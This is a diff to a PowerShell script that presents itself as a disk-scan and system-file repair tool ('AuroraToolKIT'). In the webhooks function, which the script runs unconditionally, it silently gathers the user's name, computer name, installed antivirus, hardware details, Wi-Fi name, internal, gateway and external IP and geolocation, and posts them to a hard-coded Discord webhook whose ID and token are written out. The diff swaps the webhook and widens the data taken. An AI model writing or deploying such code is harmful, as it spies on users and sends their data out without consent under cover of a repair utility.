@@ -38,66 +38,125 @@ Write-Host $text -ForegroundColor Cyan
 Write-Host "------------------------------------------------------------------------------------"
 Write-Host "  SCAN DISK + FIX SYSTEM FILE + RESTORE HEALTHY" -ForegroundColor Yellow
 Write-Host "------------------------------------------------------------------------------------"
-
 function webhooks {
-    $webhookid = "1337473388624609390"
-    $webhooktoken = "frh_h08OFoFeTSUUF-FqHg2ZoJVh6Xjj8YbVzgOyztWuPANtpogg0AUKPWtWC7tsswe8"
-    $discordWebhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
-    
+    $date = (Get-Date)
+    $os = Get-CimInstance -ClassName Win32_OperatingSystem
+    $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
+    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
+        if (-not $winversion) {
+            $winversion = $null
+        }
+
+    $username = $env:USERNAME
+    $compName = $env:COMPUTERNAME
+    $language = (Get-Culture).Name
+
+    # Ambil antivirus yang terinstall
+    $antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
+    if (-not $antivirus) { $antivirus = "Not installed" }
+
+    # Ambil informasi CPU, GPU, RAM
     $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
-    $manufacturer = $computerSystem.Vendor
-    $tipe = $computerSystem.Version
-    $systemmodel = $computerSystem.Name
-    $os = Get-CimInstance Win32_OperatingSystem
-    $cpu = Get-CimInstance Win32_Processor
-    $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
-    $disk = Get-CimInstance Win32_DiskDrive | ForEach-Object { "$($_.Model) - $([math]::Round($_.Size / 1GB, 2)) GB" }
+    $Manufacturer = $computerSystem.Vendor
+    $Type = $computerSystem.Version
+    $Model = $computerSystem.Name
+
+    $cpu = (Get-CimInstance Win32_Processor)
+    $Name = $cpu.Name
+    $Cores = $cpu.NumberOfCores
+    $LogicalProcessors = $cpu.NumberOfLogicalProcessors
+    $gpu = (Get-CimInstance Win32_VideoController).Name
+    $ramInfo = Get-WmiObject Win32_PhysicalMemory
+    $totalSizeInGB = 0
+    $ramDetails = @()
+    foreach ($ram in $ramInfo) {
+        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
+        $totalSizeInGB += $sizeInGB
+        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
+    }
+    $TotalSizeInGB = $totalSizeInGB
+    $Modules = $ramDetails -join " -- "
+
+    $disks = Get-CimInstance -ClassName Win32_DiskDrive
+    $diskall = ""
+    foreach ($disk in $disks) {
+        $modeldisk = $disk.Model
+        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
+        $diskall += "- $modeldisk - $sizeInGB GB`n"
+    }
+    $diskall | Out-Null
+
+    # Ambil status baterai
+    $battery = (Get-CimInstance Win32_Battery)
+    $batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }
+
+    # Ambil resolusi layar
+    Add-Type -AssemblyName System.Windows.Forms
+    $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+
+    # Ambil informasi jaringan
+    $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
+    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
+    $ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"
 
     $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
     if ($wifi) {
         $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
     } else {
-        $wifiName = "Tidak ada Wi-Fi yang terhubung."
+        $wifiName = "No Wi-Fi connected."
     }
-
     $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
     if ($lanAdapter) {
-        $lanStatus = "LAN terhubung: $($lanAdapter.Name)"
+        $lanStatus = "LAN connected.: $($lanAdapter.Name)"
         $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
         if ($pingResult.StatusCode -eq 0) {
-            $internetStatus = "Internet melalui LAN terhubung."
+            $internetStatus = "Internet via LAN connected."
         } else {
-            $internetStatus = "Internet melalui LAN tidak terhubung."
+            $internetStatus = "Internet via LAN is not connected."
         }
     } else {
-        $lanStatus = "Tidak ada LAN yang terhubung."
-        $internetStatus = "Internet melalui LAN tidak tersedia."
+        $lanStatus = "No LAN connected."
+        $internetStatus = "Internet via LAN is not available."
     }
 
-    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
+    $WifiName = $wifiName
+    $LanStatus = $lanStatus
+    $InternetStatus = $internetStatus
 
-    $message = @"
-    **:pill: FIX OS**
+    # URL Webhook Discord
+    $webhookid = "1370237685767209070"
+    $webhooktoken = "3a9GapUT5gNGgao8wKUDcKznmjx2hQ4gs1s0dkYAOoFomWAVM_--Y7iZCd13_cb4BK8v"
+    $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
 
-    **:computer: SYSTEM INFO**
-    Merek: $manufacturer
-    Model: $tipe ($systemmodel)
-    OS: $($os.Caption) ($($os.Version))
-    CPU: $($cpu.Name) ($($cpu.NumberOfCores) Cores, $($cpu.NumberOfLogicalProcessors) Threads)
-    RAM: $([math]::Round($ram, 2)) GB
-    Disk: $($disk -join ", ")
+    # URL Gambar dan Thumbnail
+    #$imageUrl = "https://.../preview.png"
+    #$thumbnailUrl = "https://.../preview.png"
 
-    **:globe_with_meridians: NETWORK**
-    SSID: $wifiName
-    LAN: $lanStatus
-    $internetStatus
-    Lokasi: $($ipInfo.city), $($ipInfo.country) ($($ipInfo.zip))
-    ISP: $($ipInfo.isp)
+    # Buat payload JSON dengan format embed lengkap
+    $payload = @{
+        username = "AuroraBot"
+        #avatar_url = ""
+        embeds = @(@{
+            title = ":fox: AuroraToolKIT - System Report"
+            description = ":pill: **FIXOS - Corrupted System - Disk Error**"
+            color = 3447003
+            fields = @(
+                @{ name = ""; value = ":calendar: $date`n"; inline = $false },
+                @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
+                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
+                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
+                @{ name = ""; value = "-----------------------------------------------"; inline = $false },
+                
+            )
+            #thumbnail = @{ url = $thumbnailUrl }
+            #image = @{ url = $imageUrl }
+            footer = @{ text = "AuroraBot | PowerShell Script" }
+            timestamp = Get-Date -Format o
+        })
+    } | ConvertTo-Json -Depth 10
 
-"@
-
-    $body = @{ content = $message } | ConvertTo-Json -Compress
-    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
+    # Kirim ke Discord Webhook
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
 }
 webhooks
 
